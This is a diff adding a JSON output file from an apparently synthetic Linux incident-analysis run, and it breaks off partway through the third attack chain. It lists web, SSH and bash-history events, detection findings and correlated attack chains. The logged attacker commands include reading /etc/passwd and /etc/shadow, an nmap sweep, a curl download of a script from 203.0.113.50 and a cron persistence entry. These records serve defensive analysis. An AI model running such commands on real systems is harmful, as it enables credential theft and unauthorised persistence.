@@ -1,0 +1,2000 @@
+{
+    "events": [
+        {
+            "event_id": "WEB-00001",
+            "timestamp": "2026-10-06T13:10:01+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:01 +0000] \"GET / HTTP/1.1\" 200 512",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 512,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00002",
+            "timestamp": "2026-10-06T13:10:04+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:04 +0000] \"GET /robots.txt HTTP/1.1\" 200 128",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/robots.txt",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 128,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00003",
+            "timestamp": "2026-10-06T13:10:09+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:09 +0000] \"GET /admin HTTP/1.1\" 403 210",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/admin",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 403,
+                "response_size": 210,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00004",
+            "timestamp": "2026-10-06T13:10:15+00:00",
+            "source": "web_access",
+            "event_type": "WEB_PATH_TRAVERSAL",
+            "message": "Potential path traversal attempt",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "HIGH",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:15 +0000] \"GET /../../etc/passwd HTTP/1.1\" 400 190",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/../../etc/passwd",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 400,
+                "response_size": 190,
+                "referer": "",
+                "user_agent": "",
+                "classification": "WEB_PATH_TRAVERSAL"
+            }
+        },
+        {
+            "event_id": "WEB-00005",
+            "timestamp": "2026-10-06T13:10:21+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:21 +0000] \"POST /upload HTTP/1.1\" 201 340",
+            "metadata": {
+                "http_method": "POST",
+                "http_path": "/upload",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 201,
+                "response_size": 340,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "WEB-00006",
+            "timestamp": "2026-10-06T13:10:30+00:00",
+            "source": "web_access",
+            "event_type": "HTTP_REQUEST",
+            "message": "HTTP request observed",
+            "user": null,
+            "source_ip": "198.51.100.77",
+            "process": null,
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "198.51.100.77 - - [06/Oct/2026:13:10:30 +0000] \"GET /uploads/update.sh HTTP/1.1\" 200 901",
+            "metadata": {
+                "http_method": "GET",
+                "http_path": "/uploads/update.sh",
+                "http_protocol": "HTTP/1.1",
+                "http_status": 200,
+                "response_size": 901,
+                "referer": "",
+                "user_agent": "",
+                "classification": "HTTP_REQUEST"
+            }
+        },
+        {
+            "event_id": "AUTH-00001",
+            "timestamp": "2026-10-06T13:11:02+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "wwwadmin",
+            "source_ip": "198.51.100.77",
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:02 server sshd[5101]: Accepted password for wwwadmin from 198.51.100.77 port 45555 ssh2",
+            "metadata": {
+                "port": 45555,
+                "authentication": "password",
+                "result": "success"
+            }
+        },
+        {
+            "event_id": "AUTH-00002",
+            "timestamp": "2026-10-06T13:11:03+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_SESSION_OPEN",
+            "message": "SSH session opened",
+            "user": "wwwadmin",
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:03 server sshd[5101]: pam_unix(sshd:session): session opened for user wwwadmin",
+            "metadata": {
+                "session_state": "opened"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00001",
+            "timestamp": "2026-10-06T13:11:15+00:00",
+            "source": "syslog",
+            "event_type": "SERVICE_STARTED",
+            "message": "System service started",
+            "user": null,
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:15 server systemd[1]: Started suspicious service process",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SERVICE_STARTED",
+                "service": "suspicious service process"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00002",
+            "timestamp": "2026-10-06T13:11:21+00:00",
+            "source": "syslog",
+            "event_type": "KERNEL_EVENT",
+            "message": "Kernel-generated system event",
+            "user": null,
+            "source_ip": null,
+            "process": "13",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 13:11:21 server kernel: audit: web process spawned shell",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "KERNEL_EVENT"
+            }
+        },
+        {
+            "event_id": "BASH-00001",
+            "timestamp": "2026-10-06T20:17:15.750904+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "whoami",
+            "severity": "INFO",
+            "raw": "whoami",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00002",
+            "timestamp": "2026-10-06T20:17:15.750945+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "id",
+            "severity": "INFO",
+            "raw": "id",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00003",
+            "timestamp": "2026-10-06T20:17:15.750958+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/passwd",
+            "severity": "HIGH",
+            "raw": "cat /etc/passwd",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00004",
+            "timestamp": "2026-10-06T20:17:15.750971+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/shadow",
+            "severity": "HIGH",
+            "raw": "cat /etc/shadow",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00005",
+            "timestamp": "2026-10-06T20:17:15.750982+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "raw": "nmap -sV 192.0.2.0/24",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00006",
+            "timestamp": "2026-10-06T20:17:15.750997+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ss -tulpn",
+            "severity": "MEDIUM",
+            "raw": "ss -tulpn",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00007",
+            "timestamp": "2026-10-06T20:17:15.751006+00:00",
+            "source": "bash_history",
+            "event_type": "DOWNLOAD",
+            "message": "Potential remote file download",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "severity": "MEDIUM",
+            "raw": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "DOWNLOAD"
+            }
+        },
+        {
+            "event_id": "BASH-00008",
+            "timestamp": "2026-10-06T20:17:15.751034+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "chmod +x /tmp/update.sh",
+            "severity": "INFO",
+            "raw": "chmod +x /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00009",
+            "timestamp": "2026-10-06T20:17:15.751052+00:00",
+            "source": "bash_history",
+            "event_type": "PERSISTENCE",
+            "message": "Potential persistence-related command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "crontab -e",
+            "severity": "HIGH",
+            "raw": "crontab -e",
+            "metadata": {
+                "shell": "bash",
+                "classification": "PERSISTENCE"
+            }
+        },
+        {
+            "event_id": "BASH-00010",
+            "timestamp": "2026-10-06T20:17:15.751060+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "severity": "INFO",
+            "raw": "echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        }
+    ],
+    "findings": [
+        {
+            "finding_id": "SUSPICIOUS-CMD-0001",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+            "severity": "HIGH",
+            "username": null,
+            "command": "cat /etc/passwd",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "BASH-00003",
+            "timestamp": "2026-10-06T20:17:15.750958+00:00",
+            "indicators": [
+                "/etc/passwd",
+                "passwd"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0002",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Credential or SSH Key Access",
+            "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+            "severity": "HIGH",
+            "username": null,
+            "command": "cat /etc/shadow",
+            "source_ip": null,
+            "category": "CREDENTIAL_ACCESS",
+            "event_id": "BASH-00004",
+            "timestamp": "2026-10-06T20:17:15.750971+00:00",
+            "indicators": [
+                "/etc/shadow",
+                "shadow"
+            ],
+            "metadata": {
+                "rule_category": "CREDENTIAL_ACCESS",
+                "source": "bash_history",
+                "original_event_type": "CREDENTIAL_ACCESS",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0003",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Network Reconnaissance Command",
+            "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "source_ip": null,
+            "category": "NETWORK_RECON",
+            "event_id": "BASH-00005",
+            "timestamp": "2026-10-06T20:17:15.750982+00:00",
+            "indicators": [
+                "nmap "
+            ],
+            "metadata": {
+                "rule_category": "NETWORK_RECON",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0004",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Potential Network Reconnaissance Command",
+            "description": "The command contains a network discovery or connection utility. Observed command: ss -tulpn",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "ss -tulpn",
+            "source_ip": null,
+            "category": "NETWORK_RECON",
+            "event_id": "BASH-00006",
+            "timestamp": "2026-10-06T20:17:15.750997+00:00",
+            "indicators": [
+                "ss -"
+            ],
+            "metadata": {
+                "rule_category": "NETWORK_RECON",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "SUSPICIOUS-CMD-0005",
+            "event_type": "SUSPICIOUS_COMMAND",
+            "title": "Suspicious File Download Command",
+            "description": "A command capable of downloading remote content was executed. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "severity": "MEDIUM",
+            "username": null,
+            "command": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "source_ip": null,
+            "category": "DOWNLOAD",
+            "event_id": "BASH-00007",
+            "timestamp": "2026-10-06T20:17:15.751006+00:00",
+            "indicators": [
+                "curl "
+            ],
+            "metadata": {
+                "rule_category": "DOWNLOAD",
+                "source": "bash_history",
+                "original_event_type": "DOWNLOAD",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "PERSISTENCE-0001",
+            "event_type": "PERSISTENCE_DETECTED",
+            "title": "Potential Cron Persistence",
+            "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: crontab -e",
+            "severity": "HIGH",
+            "category": "CRON",
+            "username": null,
+            "command": "crontab -e",
+            "source_ip": null,
+            "event_id": "BASH-00009",
+            "timestamp": "2026-10-06T20:17:15.751052+00:00",
+            "indicators": [
+                "crontab"
+            ],
+            "metadata": {
+                "rule_category": "CRON",
+                "source": "bash_history",
+                "original_event_type": "PERSISTENCE",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "PERSISTENCE-0002",
+            "event_type": "PERSISTENCE_DETECTED",
+            "title": "Potential Cron Persistence",
+            "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "severity": "HIGH",
+            "category": "CRON",
+            "username": null,
+            "command": "echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+            "source_ip": null,
+            "event_id": "BASH-00010",
+            "timestamp": "2026-10-06T20:17:15.751060+00:00",
+            "indicators": [
+                "crontab",
+                "/var/spool/cron"
+            ],
+            "metadata": {
+                "rule_category": "CRON",
+                "source": "bash_history",
+                "original_event_type": "BASH_COMMAND",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "NETWORK-ACTIVITY-0001",
+            "event_type": "NETWORK_ACTIVITY",
+            "title": "Potential Port Scanning Activity",
+            "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+            "severity": "HIGH",
+            "category": "PORT_SCAN",
+            "username": null,
+            "command": "nmap -sV 192.0.2.0/24",
+            "source_ip": null,
+            "destination_ip": null,
+            "destination_port": null,
+            "event_id": "BASH-00005",
+            "timestamp": "2026-10-06T20:17:15.750982+00:00",
+            "indicators": [
+                "nmap "
+            ],
+            "metadata": {
+                "rule_category": "PORT_SCAN",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "NETWORK-ACTIVITY-0002",
+            "event_type": "NETWORK_ACTIVITY",
+            "title": "Network Connection Enumeration",
+            "description": "The command enumerates active or listening network connections. Observed command: ss -tulpn",
+            "severity": "MEDIUM",
+            "category": "CONNECTION_ENUMERATION",
+            "username": null,
+            "command": "ss -tulpn",
+            "source_ip": null,
+            "destination_ip": null,
+            "destination_port": null,
+            "event_id": "BASH-00006",
+            "timestamp": "2026-10-06T20:17:15.750997+00:00",
+            "indicators": [
+                "ss -"
+            ],
+            "metadata": {
+                "rule_category": "CONNECTION_ENUMERATION",
+                "source": "bash_history",
+                "original_event_type": "NETWORK_RECON",
+                "sudo_context": false
+            }
+        },
+        {
+            "finding_id": "NETWORK-ACTIVITY-0003",
+            "event_type": "NETWORK_ACTIVITY",
+            "title": "Remote Network Download",
+            "description": "The command downloads content from a remote network location. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "severity": "MEDIUM",
+            "category": "REMOTE_DOWNLOAD",
+            "username": null,
+            "command": "curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+            "source_ip": null,
+            "destination_ip": null,
+            "destination_port": null,
+            "event_id": "BASH-00007",
+            "timestamp": "2026-10-06T20:17:15.751006+00:00",
+            "indicators": [
+                "curl http://"
+            ],
+            "metadata": {
+                "rule_category": "REMOTE_DOWNLOAD",
+                "source": "bash_history",
+                "original_event_type": "DOWNLOAD",
+                "sudo_context": false
+            }
+        }
+    ],
+    "attack_chains": [
+        {
+            "chain_id": "CHAIN-0001",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Reconstructed attack sequence: Credential Access \u2192 Persistence. The activity involved unidentified account(s) and unidentified source(s). 4 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+            "severity": "HIGH",
+            "confidence": 60,
+            "start_time": "2026-10-06T20:17:15.750958+00:00",
+            "end_time": "2026-10-06T20:17:15.751060+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0001-STEP-01",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/passwd",
+                    "timestamp": "2026-10-06T20:17:15.750958+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00003"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0001"
+                    ],
+                    "indicators": [
+                        "/etc/passwd",
+                        "passwd"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0001-STEP-02",
+                    "stage": "CREDENTIAL_ACCESS",
+                    "title": "Potential Credential or SSH Key Access",
+                    "description": "The command references credential stores or SSH authentication material. Observed command: cat /etc/shadow",
+                    "timestamp": "2026-10-06T20:17:15.750971+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00004"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0002"
+                    ],
+                    "indicators": [
+                        "/etc/shadow",
+                        "shadow"
+                    ],
+                    "metadata": {
+                        "category": "CREDENTIAL_ACCESS",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0001-STEP-03",
+                    "stage": "PERSISTENCE",
+                    "title": "Potential Cron Persistence",
+                    "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: crontab -e",
+                    "timestamp": "2026-10-06T20:17:15.751052+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00009"
+                    ],
+                    "finding_ids": [
+                        "PERSISTENCE-0001"
+                    ],
+                    "indicators": [
+                        "crontab"
+                    ],
+                    "metadata": {
+                        "category": "CRON",
+                        "event_type": "PERSISTENCE_DETECTED",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0001-STEP-04",
+                    "stage": "PERSISTENCE",
+                    "title": "Potential Cron Persistence",
+                    "description": "The command references cron configuration that can be used to execute commands automatically. Observed command: echo \"*/10 * * * * /tmp/update.sh\" >> /var/spool/cron/crontabs/wwwadmin",
+                    "timestamp": "2026-10-06T20:17:15.751060+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00010"
+                    ],
+                    "finding_ids": [
+                        "PERSISTENCE-0002"
+                    ],
+                    "indicators": [
+                        "crontab",
+                        "/var/spool/cron"
+                    ],
+                    "metadata": {
+                        "category": "CRON",
+                        "event_type": "PERSISTENCE_DETECTED",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0001",
+                "SUSPICIOUS-CMD-0002",
+                "PERSISTENCE-0001",
+                "PERSISTENCE-0002"
+            ],
+            "event_ids": [
+                "BASH-00003",
+                "BASH-00004",
+                "BASH-00009",
+                "BASH-00010"
+            ],
+            "metadata": {
+                "stages": [
+                    "CREDENTIAL_ACCESS",
+                    "PERSISTENCE"
+                ],
+                "stage_count": 2,
+                "finding_count": 4,
+                "event_count": 4,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": [
+                    {
+                        "type": "TEMPORAL_CORRELATION",
+                        "reason": "Related findings occurred within the configured investigation window.",
+                        "duration_seconds": 0.000102,
+                        "confidence": 80
+                    }
+                ],
+                "attack_sequence": [
+                    {
+                        "order": 1,
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0001"
+                        ],
+                        "event_ids": [
+                            "BASH-00003"
+                        ]
+                    },
+                    {
+                        "order": 2,
+                        "stage": "CREDENTIAL_ACCESS",
+                        "title": "Potential Credential or SSH Key Access",
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0002"
+                        ],
+                        "event_ids": [
+                            "BASH-00004"
+                        ]
+                    },
+                    {
+                        "order": 3,
+                        "stage": "PERSISTENCE",
+                        "title": "Potential Cron Persistence",
+                        "finding_ids": [
+                            "PERSISTENCE-0001"
+                        ],
+                        "event_ids": [
+                            "BASH-00009"
+                        ]
+                    },
+                    {
+                        "order": 4,
+                        "stage": "PERSISTENCE",
+                        "title": "Potential Cron Persistence",
+                        "finding_ids": [
+                            "PERSISTENCE-0002"
+                        ],
+                        "event_ids": [
+                            "BASH-00010"
+                        ]
+                    }
+                ]
+            }
+        },
+        {
+            "chain_id": "CHAIN-0002",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Reconstructed attack sequence: Reconnaissance. The activity involved unidentified account(s) and unidentified source(s). 4 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+            "severity": "HIGH",
+            "confidence": 56,
+            "start_time": "2026-10-06T20:17:15.750982+00:00",
+            "end_time": "2026-10-06T20:17:15.750997+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0002-STEP-01",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Network Reconnaissance Command",
+                    "description": "The command contains a network discovery or connection utility. Observed command: nmap -sV 192.0.2.0/24",
+                    "timestamp": "2026-10-06T20:17:15.750982+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00005"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0003"
+                    ],
+                    "indicators": [
+                        "nmap "
+                    ],
+                    "metadata": {
+                        "category": "NETWORK_RECON",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0002-STEP-02",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Port Scanning Activity",
+                    "description": "A network scanning utility was executed and may indicate reconnaissance against network hosts or services. Observed command: nmap -sV 192.0.2.0/24",
+                    "timestamp": "2026-10-06T20:17:15.750982+00:00",
+                    "severity": "HIGH",
+                    "event_ids": [
+                        "BASH-00005"
+                    ],
+                    "finding_ids": [
+                        "NETWORK-ACTIVITY-0001"
+                    ],
+                    "indicators": [
+                        "nmap "
+                    ],
+                    "metadata": {
+                        "category": "PORT_SCAN",
+                        "event_type": "NETWORK_ACTIVITY",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0002-STEP-03",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Potential Network Reconnaissance Command",
+                    "description": "The command contains a network discovery or connection utility. Observed command: ss -tulpn",
+                    "timestamp": "2026-10-06T20:17:15.750997+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00006"
+                    ],
+                    "finding_ids": [
+                        "SUSPICIOUS-CMD-0004"
+                    ],
+                    "indicators": [
+                        "ss -"
+                    ],
+                    "metadata": {
+                        "category": "NETWORK_RECON",
+                        "event_type": "SUSPICIOUS_COMMAND",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                },
+                {
+                    "step_id": "CHAIN-0002-STEP-04",
+                    "stage": "RECONNAISSANCE",
+                    "title": "Network Connection Enumeration",
+                    "description": "The command enumerates active or listening network connections. Observed command: ss -tulpn",
+                    "timestamp": "2026-10-06T20:17:15.750997+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00006"
+                    ],
+                    "finding_ids": [
+                        "NETWORK-ACTIVITY-0002"
+                    ],
+                    "indicators": [
+                        "ss -"
+                    ],
+                    "metadata": {
+                        "category": "CONNECTION_ENUMERATION",
+                        "event_type": "NETWORK_ACTIVITY",
+                        "source": null,
+                        "evidence_sources": [
+                            "bash_history"
+                        ],
+                        "usernames": [],
+                        "source_ips": []
+                    }
+                }
+            ],
+            "finding_ids": [
+                "SUSPICIOUS-CMD-0003",
+                "NETWORK-ACTIVITY-0001",
+                "SUSPICIOUS-CMD-0004",
+                "NETWORK-ACTIVITY-0002"
+            ],
+            "event_ids": [
+                "BASH-00005",
+                "BASH-00006"
+            ],
+            "metadata": {
+                "stages": [
+                    "RECONNAISSANCE"
+                ],
+                "stage_count": 1,
+                "finding_count": 4,
+                "event_count": 2,
+                "evidence_sources": [
+                    "bash_history"
+                ],
+                "cross_evidence": false,
+                "correlation_window_seconds": 900,
+                "correlation_signals": [
+                    {
+                        "type": "TEMPORAL_CORRELATION",
+                        "reason": "Related findings occurred within the configured investigation window.",
+                        "duration_seconds": 1.5e-05,
+                        "confidence": 80
+                    }
+                ],
+                "attack_sequence": [
+                    {
+                        "order": 1,
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0003"
+                        ],
+                        "event_ids": [
+                            "BASH-00005"
+                        ]
+                    },
+                    {
+                        "order": 2,
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Port Scanning Activity",
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0001"
+                        ],
+                        "event_ids": [
+                            "BASH-00005"
+                        ]
+                    },
+                    {
+                        "order": 3,
+                        "stage": "RECONNAISSANCE",
+                        "title": "Potential Network Reconnaissance Command",
+                        "finding_ids": [
+                            "SUSPICIOUS-CMD-0004"
+                        ],
+                        "event_ids": [
+                            "BASH-00006"
+                        ]
+                    },
+                    {
+                        "order": 4,
+                        "stage": "RECONNAISSANCE",
+                        "title": "Network Connection Enumeration",
+                        "finding_ids": [
+                            "NETWORK-ACTIVITY-0002"
+                        ],
+                        "event_ids": [
+                            "BASH-00006"
+                        ]
+                    }
+                ]
+            }
+        },
+        {
+            "chain_id": "CHAIN-0003",
+            "title": "Correlated Linux Attack Chain",
+            "summary": "Reconstructed attack sequence: Command & Control. The activity involved unidentified account(s) and unidentified source(s). 2 finding(s) were correlated. 1 correlation signal(s) support the reconstructed sequence.",
+            "severity": "MEDIUM",
+            "confidence": 50,
+            "start_time": "2026-10-06T20:17:15.751006+00:00",
+            "end_time": "2026-10-06T20:17:15.751006+00:00",
+            "source_ips": [],
+            "usernames": [],
+            "steps": [
+                {
+                    "step_id": "CHAIN-0003-STEP-01",
+                    "stage": "COMMAND_AND_CONTROL",
+                    "title": "Suspicious File Download Command",
+                    "description": "A command capable of downloading remote content was executed. Observed command: curl http://203.0.113.50/update.sh -o /tmp/update.sh",
+                    "timestamp": "2026-10-06T20:17:15.751006+00:00",
+                    "severity": "MEDIUM",
+                    "event_ids": [
+                        "BASH-00007"
+                    ],
+                    "finding_ids": [
